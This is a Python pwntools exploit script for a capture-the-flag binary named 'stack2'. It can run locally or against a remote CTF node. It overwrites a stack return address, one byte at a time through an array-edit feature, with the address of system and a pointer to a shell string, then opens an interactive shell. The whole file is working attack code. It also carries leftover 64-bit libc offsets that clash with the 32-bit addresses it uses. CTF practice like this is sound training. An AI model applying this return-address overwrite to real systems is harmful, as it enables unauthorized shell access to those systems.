#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/06/16 19:43:30
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
# here put the import lib
from pwn import *
from LibcSearcher import *
import pwnlib
debug = 1
context.log_level = 'debug'
context.arch = 'amd64'
if debug:
    sh = process('stack2')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    one_offset = [0x45226,0x4527a,0xf03a4,0xf1247]
else:
    IP = 'node4.buuoj.cn'
    port = 25683
    sh = remote(IP,port)
    libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so')
    one_offset = [0x45216,0x4526a,0xf02a4,0xf1147]
elf = ELF('stack2')

def debug():
    gdb.attach(sh)
    pause()
def cmd(choice):
    sh.recvuntil("5. exit\n")
    sh.sendline(str(choice))

def edit(idx,num):
    cmd(3)
    sh.recvuntil("which number to change:\n")
    sh.sendline(str(idx))
    sh.recvuntil("new number:\n")
    sh.sendline(str(num))
    
sh.recvuntil("How many numbers you have:\n")
sh.sendline("1")
sh.recvuntil("Give me your numbers\n")
sh.sendline("1")
offset_ret = 0x84
system_addr = 0x08048450
edit(offset_ret,0x50)
edit(offset_ret+1,0x84)
edit(offset_ret+2,0x04)
edit(offset_ret+3,0x08)

sh_addr = 0x08048987
offset_arg = offset_ret + 8
edit(offset_arg,0x87)
edit(offset_arg+1,0x89)
edit(offset_arg+2,0x04)
edit(offset_arg+3,0x08)
debug()
cmd(5)
sh.interactive()